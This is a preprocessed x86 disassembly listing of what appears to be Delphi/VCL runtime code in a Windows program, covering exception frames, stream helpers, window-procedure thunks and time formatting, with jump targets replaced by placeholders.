mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_430438
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4305a0
cmp ebp eax
jne r-xdata
sub_43d194
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x34 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_43c510
mov edx ebx
call sub_43c22c
sub_43d1c0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4055c0
mov [ edi + 0xc ] esi
movzx eax [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43d20c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4055f0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_43d244
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_43d293
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_43d2ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_43d2fb
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_43d314
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43d37e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_43d398
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_43d3e1
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_433cec
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43d3fc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_409d28
xor eax eax
push ebp
push sub_43d5ef
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor eax eax
push ebp
push sub_43d5c8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_404204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43d5b7
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_404220
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4061a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d5f6
lea eax [ ebp + 0xc ]
call sub_409cb4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4061a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_43d634
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_43d697
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_43d6c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_431088
mov edi eax
xor eax eax
push ebp
push sub_43d728
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d72f
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call LeaveCriticalSection
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4305a0
call sub_4055f0
inc esi
dec ebx
jne r-xdata
sub_43d748
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d852
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_43d830
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_405b0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d837
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_43010c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4054c8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e8
call sub_4060b0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43d888
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
test bl bl
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
mov edx esi
mov eax [ rw-data ]
call [ rw-data ]
sub_43d8e4
push ebx
mov ebx eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_43c47c
xor edx edx
mov eax ebx
call sub_435510
cmp [ ebx + 0x58 ] 0x0
jne r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
sub_43d910
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_405bb4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_43d993
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x38 ]
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43c198
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d99a
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call [ rw-data ]
sub_43d9ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_43d9e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43d9e9
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
test al al
jne r-xdata
call sub_406174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_406120
sub_43da0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_43da44
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43da70
push ebp
mov ebp esp
mov al 0x1
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x4 ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x34 ]
setne al
sub_43da98
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x3c ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x3c ]
setne al
pop ebp
retn
sub_43dacc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x40 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x40 ]
setne al
pop ebp
retn
sub_43db00
push ebp
mov ebp esp
mov al 0x1
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x4 ] 0x0
je r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x38 ]
setne al
sub_43db28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x8 ] eax
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43c58c
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd54
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd8c
push ebp
call sub_43db00
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd2c
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd74
push ebp
call sub_43da98
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd40
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd80
push ebp
call sub_43dacc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd18
mov eax [ ebp - 0x8 ]
push eax
push sub_43dd68
push ebp
call sub_43da70
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43dc67
inc [ 0x57000000 ]
add [ ecx ] ch
add [ fs : eax + eax + 0x68 ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_43c628
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_43caf8
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43cacc
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40587c
test al al
jne r-xdata
sub_43dd98
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_43ddc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4043c8
mov edx sub_43dd98
lea eax [ esi + 0x5 ]
call sub_43ddb8
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_43ddb8
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_43de6c
push esi
push edi
push ebp
xor esi esi
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
pop ebp
pop edi
pop esi
retn
mov edi [ ecx + 0x5 ]
mov ebp ecx
cmp eax ebp
ja r-xdata
mov esi ecx
mov ecx edi
test ecx ecx
jne r-xdata
cmp edx ebp
jb r-xdata
mov ecx esi
test esi esi
jne r-xdata
mov [ esi + 0x5 ] edi
mov [ rw-data ] edi
jmp r-xdata
sub_43dea8
push ebx
push esi
xor ebx ebx
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov ecx 0x139
dec ecx
cmp ecx 0xffffffff
jne r-xdata
inc ebx
jmp r-xdata
imul esi ecx 0xd
lea esi [ edx + esi + 0xa ]
cmp eax esi
jne r-xdata
mov eax [ eax + 0x5 ]
test eax eax
jne r-xdata
sub_43ded8
push ebx
push esi
push edi
push ebp
mov ebx [ rw-data ]
xor esi esi
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx ]
mov edx ebx
mov eax [ rw-data ]
call sub_43dea8
mov ebp eax
cmp ebp 0x13a
jne r-xdata
mov esi ebx
mov ebx edi
test ebx ebx
jne r-xdata
mov edx ebx
add edx 0xffc
dec edx
mov eax ebx
call sub_43de6c
push 0x8000
push 0x0
push ebx
call VirtualFree
mov ebx esi
test esi esi
jne r-xdata
mov [ esi ] edi
mov [ rw-data ] edi
jmp r-xdata
sub_43df58
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoW
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcW
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassW
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassW
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_40c5c8
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43ddc0
push eax
push 0xfffffffc
push ebx
call SetWindowLongW
sub_43e00c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongW
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcW
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43de58
sub_43e034
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43e0bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
call sub_412418
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
call GetLastError
lea edx [ ebp - 0x18 ]
call sub_415718
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx esi
xor edx edx
mov eax edi
call sub_4162b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e0c4
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_4068c4
retn
add esp 0xfffffff0
call sub_405b0c
sub_43e0c4
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_43e0e4
push ebp
mov ebp esp
push ebx
xor eax eax
push ebp
push sub_43e1aa
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e1b1
retn
mov eax [ rw-data ]
call sub_42f980
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_43d6c8
xor edx edx
xor eax eax
call sub_435510
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
call sub_40a7e8
mov ebx [ eax + 0x10 ]
call sub_40a7e8
xor edx edx
mov [ eax + 0x10 ] edx
mov eax ebx
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
mov eax rw-data
call sub_409cb4
mov eax sub_43d740
call sub_409b4c
mov eax [ rw-data ]
xor edx edx
mov [ rw-data ] edx
call sub_4055f0
call sub_43ded8
mov eax rw-data
call sub_409cb4
sub_43e200
add esp 0xfffffff8
mov ecx eax
fild [ ecx ]
fld [ r-xdata ]
fmulp st1
fstp [ esp ]
fwait
fld [ r-xdata ]
fcomp [ esp ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ r-xdata ]
fcomp [ esp ]
fwait
fnstsw ax
sahf
jbe r-xdata
mov [ esp ] 0xeb1c4328
mov [ esp + 0x4 ] 0x430a36e2
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
retn
mov [ esp ] 0xeb1c4328
mov [ esp + 0x4 ] 0xc30a36e2
sub_43e27c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43e3ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4070fc
push 0xc9
push 0x2a69c000
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_4082cc
mov esi eax
push 0xc9
push 0x2a69c000
mov eax [ ebx ]
mov edx [ ebx + 0x4 ]
call sub_408360
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
jge r-xdata
cmp [ ebx ] 0x0
jae r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
push 0x0
push 0x989680
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_408360
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_407564
push edi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x34 ] 0x0
push 0x0
push 0x18
push 0x8
push 0x61c46800
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4082cc
call sub_408360
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0x10
push 0x0
push 0x3c
push 0x0
push 0x23c34600
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4082cc
call sub_408360
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] edx
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0x10
push 0x0
push 0x3c
push 0x0
push 0x989680
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4082cc
call sub_408360
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4c ] edx
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x10
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x38 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_4129f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e3f1
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4074a4
sub_43e5ef
call [ eax + ebp * 8 + 0x43 ]
add [ eax ] cl
push ebx
jns r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ ecx ] al
clc
adc [ eax ] al
add al 0x0
add [ eax ] al
pop es
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax + edx + 0x80040 ] ebx
add [ eax ] al
or al [ esi + 0x4c ]
popad
jae r-xdata
arpl [ edi + 0x62 ] cx
push 0x73
push esp
call sub_45e646
nop
pop esp
out 0x43 al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x18 ] bl
inc ebx
add [ eax - 0x1a ] ch
inc ebx
